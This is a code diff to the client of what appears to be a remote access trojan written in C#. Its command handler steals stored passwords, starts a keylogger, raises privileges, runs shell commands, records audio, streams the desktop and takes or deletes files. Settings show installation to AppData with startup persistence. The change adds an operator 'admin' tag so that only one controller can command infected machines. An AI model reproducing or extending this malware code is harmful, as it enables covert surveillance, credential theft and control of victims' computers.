@@ -20,6 +20,7 @@ using Client.Helpers.Networking;
 using Client.Helpers.Services;
 using Client.Helpers.Services.InputSimulator;
 using Client.Helpers.Telepathy;
+using System.Windows.Threading;
 using Message = Client.Helpers.Telepathy.Message;
 
 namespace Client.Forms
@@ -98,6 +99,8 @@ namespace Client.Forms
 
         private readonly int Interval;
         private readonly int Port;
+        private readonly string Admin;
+        private string adm;
         private readonly bool Install;
         private readonly bool Startup;
         private bool ReceivingFile;
@@ -168,6 +171,7 @@ namespace Client.Forms
                 Process.Start("dotnetfx.exe");
             Interval = Convert.ToInt16(ClientSettings.UpdateInterval);
             Port = Convert.ToInt16(ClientSettings.Port);
+            Admin = ClientSettings.Admin;
             if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase)) Install = true;
             if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase)) Startup = true;
             InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
@@ -216,6 +220,10 @@ namespace Client.Forms
                     case EventType.Connected:
                         Console.WriteLine("Connected");
                         List<byte> ToSend = new List<byte>();
+                        ToSend.Add((int)DataType.AdminType);
+                        ToSend.AddRange(Encoding.UTF8.GetBytes(ClientSettings.Admin));
+                        Networking.MainClient.Send(ToSend.ToArray());
+                        ToSend.Clear();
                         ToSend.Add((int) DataType.ClientTag);
                         ToSend.AddRange(Encoding.UTF8.GetBytes(ClientSettings.ClientTag));
                         Networking.MainClient.Send(ToSend.ToArray());
@@ -322,147 +330,154 @@ namespace Client.Forms
             try
             {
                 StringForm = Encoding.UTF8.GetString(RawData);
+
+                adm = GetSubstringByString("[admin", "admin]", StringForm);
+                int d = StringForm.IndexOf("admin]");
+                StringForm = StringForm.Substring(d+6);
             }
-            catch { }
+            catch {
+            }
 
             #region Non-Parameterized Commands
-
-            switch (StringForm)
+            if (adm == Admin)
             {
-                case "KillClient":
-                    KillClient();
-                    break;
+                switch (StringForm)
+                {
+                    case "KillClient":
+                        KillClient();
+                        break;
 
-                case "DisconnectClient":
-                    DisconnectClient();
-                    break;
+                    case "DisconnectClient":
+                        DisconnectClient();
+                        break;
 
-                case "GetProcesses":
-                    GetProcesses();
-                    break;
+                    case "GetProcesses":
+                        GetProcesses();
+                        break;
 
-                case "GetComputerInfo":
-                    GetComputerInfo();
-                    break;
+                    case "GetComputerInfo":
+                        GetComputerInfo();
+                        break;
 
-                case "RaisePerms":
-                    RaisePerms();
-                    break;
+                    case "RaisePerms":
+                        RaisePerms();
+                        break;
 
-                case "GoUpDir":
-                    GoUpDir();
-                    break;
+                    case "GoUpDir":
+                        GoUpDir();
+                        break;
 
-                case "GetStoredPasswords":
-                    GetPasswords();
-                    break;
+                    case "GetStoredPasswords":
+                        GetPasswords();
+                        break;
 
-                case "ToggleAntiProcess":
-                    ToggleAntiProcess();
-                    break;
+                    case "ToggleAntiProcess":
+                        ToggleAntiProcess();
+                        break;
 
-                case "ToggleScreenlock":
-                    ToggleScreenlock();
-                    break;
+                    case "ToggleScreenlock":
+                        ToggleScreenlock();
+                        break;
 
-                case "OpenChat":
-                    OpenChat();
-                    break;
+                    case "OpenChat":
+                        OpenChat();
+                        break;
 
-                case "CloseChat":
-                    CloseChat();
-                    break;
+                    case "CloseChat":
+                        CloseChat();
+                        break;
 
-                case "StartRD":
-                    StartRD();
-                    break;
+                    case "StartRD":
+                        StartRD();
+                        break;
 
-                case "StopRD":
-                    StopRD();
-                    break;
+                    case "StopRD":
+                        StopRD();
+                        break;
 
-                case "StartAR":
-                    StartAR();
-                    break;
+                    case "StartAR":
+                        StartAR();
+                        break;
 
-                case "StopAR":
-                    StopAR();
-                    break;
+                    case "StopAR":
+                        StopAR();
+                        break;
 
-                case "StartKL":
-                    StartKL();
-                    break;
+                    case "StartKL":
+                        StartKL();
+                        break;
 
-                case "StopKL":
-                    StopKL();
-                    break;
+                    case "StopKL":
+                        StopKL();
+                        break;
 
-                case "StartRS":
-                    StartRS();
-                    break;
+                    case "StartRS":
+                        StartRS();
+                        break;
 
-                case "StopRS":
-                    StopRS();
-                    break;
+                    case "StopRS":
+                        StopRS();
+                        break;
 
-                case "StartUsageStream":
-                    StartUsageStream();
-                    break;
+                    case "StartUsageStream":
+                        StartUsageStream();
+                        break;
 
-                case "StopUsageStream":
-                    StopUsageStream();
-                    break;
+                    case "StopUsageStream":
+                        StopUsageStream();
+                        break;
 
-                case "ShutDown":
-                    ShutDown();
-                    break;
+                    case "ShutDown":
+                        ShutDown();
+                        break;
 
-                case "Reboot":
-                    Reboot();
-                    break;
+                    case "Reboot":
+                        Reboot();
+                        break;
 
-                case "SleepMode":
-                    SleepMode();
-                    break;
+                    case "SleepMode":
+                        SleepMode();
+                        break;
 
-                case "LogOff":
-                    LogOff();
-                    break;
+                    case "LogOff":
+                        LogOff();
+                        break;
 
-                case "LockUser":
-                    LockUser();
-                    break;
+                    case "LockUser":
+                        LockUser();
+                        break;
+
+                }
+
+                #endregion Non-Parameterized Commands
+
+                #region Parameterized Commands
+
+                if (StringForm.Contains("MsgBox"))
+                    MsgBox(StringForm);
+                else if (StringForm.Contains("EndProcess"))
+                    EndProcess(StringForm);
+                else if (StringForm.Contains("OpenWebsite"))
+                    OpenWebsite(StringForm);
+                else if (StringForm.Contains("GetDF"))
+                    GetDF(StringForm);
+                else if (StringForm.Contains("GetFile"))
+                    GetFile(StringForm);
+                else if (StringForm.Contains("StartFileReceive"))
+                    StartFileReceive(StringForm);
+                else if (StringForm.Contains("TryOpen"))
+                    TryOpen(StringForm);
+                else if (StringForm.Contains("DeleteFile"))
+                    DeleteFile(StringForm);
+                else if (StringForm.Contains("[<MESSAGE>]"))
+                    Message(StringForm.Replace("[<MESSAGE>]", ""));
+                else if (StringForm.Contains("[<TTS>]"))
+                    TTS(StringForm.Replace("[<TTS>]", ""));
+                else if (StringForm.Contains("[<COMMAND>]"))
+                    Command(StringForm.Replace("[<COMMAND>]", ""));
+                else if (StringForm.Contains("[<MOUSE>]"))
+                    MouseClick(StringForm);
             }
-
-            #endregion Non-Parameterized Commands
-
-            #region Parameterized Commands
-
-            if (StringForm.Contains("MsgBox"))
-                MsgBox(StringForm);
-            else if (StringForm.Contains("EndProcess"))
-                EndProcess(StringForm);
-            else if (StringForm.Contains("OpenWebsite"))
-                OpenWebsite(StringForm);
-            else if (StringForm.Contains("GetDF"))
-                GetDF(StringForm);
-            else if (StringForm.Contains("GetFile"))
-                GetFile(StringForm);
-            else if (StringForm.Contains("StartFileReceive"))
-                StartFileReceive(StringForm);
-            else if (StringForm.Contains("TryOpen"))
-                TryOpen(StringForm);
-            else if (StringForm.Contains("DeleteFile"))
-                DeleteFile(StringForm);
-            else if (StringForm.Contains("[<MESSAGE>]"))
-                Message(StringForm.Replace("[<MESSAGE>]", ""));
-            else if (StringForm.Contains("[<TTS>]"))
-                TTS(StringForm.Replace("[<TTS>]", ""));
-            else if (StringForm.Contains("[<COMMAND>]"))
-                Command(StringForm.Replace("[<COMMAND>]", ""));
-            else if (StringForm.Contains("[<MOUSE>]"))
-                MouseClick(StringForm);
-
             #endregion Parameterized Commands
         }
 
@@ -789,7 +804,7 @@ namespace Client.Forms
             {
                 List<byte> ToSend = new List<byte>();
                 ToSend.Add((int)DataType.NotificationType);
-                ToSend.AddRange(Encoding.UTF8.GetBytes("Error opening this directory: " + EX.Message + ""));
+                ToSend.AddRange(Encoding.UTF8.GetBytes("Ошибка : " + EX.Message + ""));
                 Networking.MainClient.Send(ToSend.ToArray());
             }
         }
@@ -894,7 +909,7 @@ namespace Client.Forms
                 GetDF(CurrentDirectory);
                 ToSend.Add((int) DataType.NotificationType);
                 ToSend.AddRange(
-                    Encoding.UTF8.GetBytes("1Файл " + Path.GetFileName(ToDelete) + " был удалён."));
+                    Encoding.UTF8.GetBytes("Файл " + Path.GetFileName(ToDelete) + " был удалён."));
                 Networking.MainClient.Send(ToSend.ToArray());
                 
             }
@@ -910,15 +925,23 @@ namespace Client.Forms
         //Updates chat box (if open) with a new message
         private void Message(string Message)
         {
-            if (C.Visibility == System.Windows.Visibility.Visible)
+            
+            try
             {
+                if (C.Visibility != System.Windows.Visibility.Visible) BeginInvoke(new MethodInvoker(delegate { OpenChat(); }));
+                BeginInvoke(new MethodInvoker(delegate { 
                 System.Windows.Controls.ContentControl t = new System.Windows.Controls.ContentControl();
                 t.Content = Message + Environment.NewLine + DateTime.Now.ToString("HH:mm");
-                Chat c = new Chat();
-                System.Windows.Style style = c.FindResource("BubbleLeftStyle") as System.Windows.Style;
+                System.Windows.Style style = C.FindResource("BubbleLeftStyle") as System.Windows.Style;
                 t.Style = style;
                 C.chatPlace.Children.Add(t);
+                }));
             }
+            catch(Exception ex)
+            {
+                MessageBox.Show(ex.Message + " " + ex.TargetSite + " " + ex.Source + " " + ex.StackTrace) ;
+            }
+
         }
 
         //Writes command to shell 
@@ -1044,10 +1067,10 @@ namespace Client.Forms
         }
 
         //Opens chat
-        private void OpenChat()
+        public void OpenChat()
         {
             if (C.Visibility != System.Windows.Visibility.Visible)
-            {
+            {    
                 ElementHost.EnableModelessKeyboardInterop(C);
                 C.Show();
             }
